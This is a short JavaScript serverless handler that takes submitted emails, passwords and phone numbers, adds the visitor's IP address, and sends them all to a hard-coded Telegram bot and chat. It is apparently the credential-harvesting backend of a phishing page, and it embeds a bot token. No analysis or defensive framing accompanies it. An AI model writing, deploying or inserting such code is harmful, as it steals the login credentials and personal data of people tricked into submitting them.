export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const BOT_TOKEN = '8555214864:AAFDB4B7O1gPe2S0bzM3AxoawifmSkctb2Y';
        const CHAT_ID = '1944734410';
        const { type, data, timestamp } = req.body;
        
        let message = `🔔 New Submission\nType: ${type}\n`;
        if (data.email) message += `Email: ${data.email}\n`;
        if (data.password) message += `Password: ${data.password}\n`;
        if (data.phone) message += `Phone: ${data.phone}\n`;
        message += `Time: ${timestamp}\nIP: ${req.headers['x-forwarded-for'] || 'unknown'}`;
        
        // Send to Telegram
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Telegram API error:', error);
        res.status(500).json({ error: 'Failed to send message' });
    }
}